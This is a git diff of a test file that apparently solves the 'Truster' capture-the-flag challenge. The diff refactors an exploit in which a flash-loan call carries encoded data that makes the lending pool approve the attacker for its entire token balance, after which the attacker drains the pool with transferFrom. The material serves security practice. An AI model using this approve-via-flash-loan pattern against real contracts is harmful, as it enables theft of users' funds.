@@ -44,12 +44,12 @@ describe('[Challenge] Truster', function () {
          * Then the attacker can call `tranferFrom` to withdraw all funds specified in the `approve`.
          */
 
-
+        const amount = await this.token.balanceOf(this.pool.address)
         const abi = ["function approve(address spender, uint256 amount) returns (bool)"]
         const iface = new Interface(abi)
         const data = iface.encodeFunctionData("approve", [
             attacker.address,
-            await this.token.balanceOf(this.pool.address)
+            amount
         ])
 
         await this.pool.connect(attacker).flashLoan(
@@ -59,7 +59,7 @@ describe('[Challenge] Truster', function () {
             data
         )
 
-        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, await this.token.balanceOf(this.pool.address))
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, amount)
     });
 
     after(async function () {
